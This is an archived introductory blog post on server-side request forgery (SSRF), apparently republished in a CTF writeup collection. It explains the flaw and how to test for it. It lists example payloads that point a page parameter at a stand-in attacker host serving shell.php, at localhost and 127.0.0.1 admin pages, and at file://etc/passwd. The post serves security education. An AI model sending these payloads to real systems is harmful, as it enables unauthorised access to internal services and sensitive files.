# :globe_with_meridians: Ssrf The Servers Loophole 01 6E7E33Fb1D57

> **Original Source:** [Ssrf The Servers Loophole 01 6E7E33Fb1D57](https://infosecwriteups.com/ssrf-the-servers-loophole-01-6e7e33fb1d57)
> **Platform:** infosecwriteups.com | **Category:** `WEB`

---

## What is SSRF?


Server Side Request Forgery (SSRF) - is a vulnerability that happens when an attacker is able to send request on behalf of a server or we can say SSRF is a type of vulnerability that allows an attacker to induce the server-side application to make request to an unintented location.


*For example*: Imagine that there is a web server which is publically on a company’s network like: public.example.com


*public.example.com *hosts a proxy service located at the /proxy that would fetch the webpage specified in the “URL” perimeter and display it back to the user. For example: when the user access the URL,

>

[http://public.example.com/proxy?url=google.com](https://public.example.com/proxy?url=google.com)


the web application would display the homepage of “google.com”


Now let’s say the admin.example.com is an internal server hosting a hidden admin panel.


To ensure that only employee can access the admin panel, access control was set up so that the panel is not accessible by any other but only by the internal valid IP. Now , what if a random user from internet trys to access the admin url, and also if there is no SSRF protection mechanism in the web application, then the application would display the admin panel to that random user.

*Hidden admin panel from the web application*


Unauthorised request that would normally be blocked by firewall controls (like fetching the hidden service in the network) is not allowed. This is because the protection that exists on the network perimeter — between public-facing webservers and internet macines — does not exists between machines on the trusted network — between public.example.com and admin.example.com


Using the ability to “forge” request from trusted server, an attacker can now conduct all kinds of nasty activity on the network. Depending on the permission given to the vulnerable server, an attacker might be able to read sensitive files, make internal API call and access internal services like hidden admin panel.

## Types of SSRF —


There are two types of SSRF vulnerabilities: Regular SSRF and Blind SSRF. The machanism behind both vulnerability are the same. They both exploit the trust between machines on the same network. The only difference is that in blind SSRF, the attacker doesn’t recieve feedback from the server via an HTTP respnse or an error message (like how admin.example.com was displayed in the example above). Although this makes data exfiltration and network exploration harder , blind SSRF are still extreme valuable for an attacker. We’ll get more into this later.

## Testing for SSRF —


The best way to discover SSRF vulnerability is a manual code review to see if all url inputs are being validated. However, if the source code is not available, efforts should be focused on testing the features of the web application that are most prone to SSRF. There is also another facet to SSRF: a trust relationship that often arises where the application server is able to interact with other back-end systems that are not directly reachable by users. These back-end systems often have routable private IP addresses or as restricted to certain hosts. Since they are protected bt the network topology, they often lack more sophisticated controls. These internal system often contain sensitive data or functionality.


## Get Anmol Shah’s stories in your inbox


Join Medium for free to get updates from this writer.


Remember me for faster sign in


Consider the following request:

>

GET [https://example.com/page?page=about.php](https://exmple.com/page?page=about.php)


You can test this request with the following payloads.


*Load the contents of the file:*

>

GET [https://example.com/page?page=https://malicious.com/shell.php](https://example.com/page?page=https%3A%2F%2Fmalicious.com%2Fshell.php)


*Access the Restricted Page:*

>

GET [https://example.com/page?page=http://localhost/admin](https://exmple.com/page?page=http%3A%2F%2Flocalhost%2Fadmin)


OR

>

GET [https://example.com/page?page=http://127.0.0.1/admin](https://exmple.com/page?page=http%3A%2F%2Flocalhost%2Fadmin)


Use the loopback interface to access content restricted to the host only. This mechanism implies that if you have access to the host, you also have privileges to directly access the admin page.


Fetch a Local File:

>

GET [https://example.com/page?page=file://etc/passwd](https://example.com/page?page=file%3A%2F%2Fetc%2Fpasswd)


HTTP Methods Used:


All of the payloads above can apply to any type of HTTP request, and could also be injected into header and cookie values as well.


One important note on SSRF with POST requests is that the SSRF may also manifest in a blind manner, because the application may not return anything immediately. Instead, the injected data may be used in other functionality such as PDF reports, invoice or order handling, etc., which may be visible to employees or staff but not necessarily to the end user or tester.


In the next blog we will be discussing the best ways to find and exploit the SSRF vulnerability by taking some real world example.


Thanks for reading. Please help me making this a better resource for new hackers. Feel free to point out any mistake or let me know if there is anything I should add :)


Until then;


WAKE EAT HACK REPEAT🔥

---

*Originally published on [Medium](https://infosecwriteups.com/ssrf-the-servers-loophole-01-6e7e33fb1d57). All credit goes to the original author.*
*Part of [CTF Collection](https://github.com/Hope0351/CTF-collection) — a curated archive of web CTF writeups.*
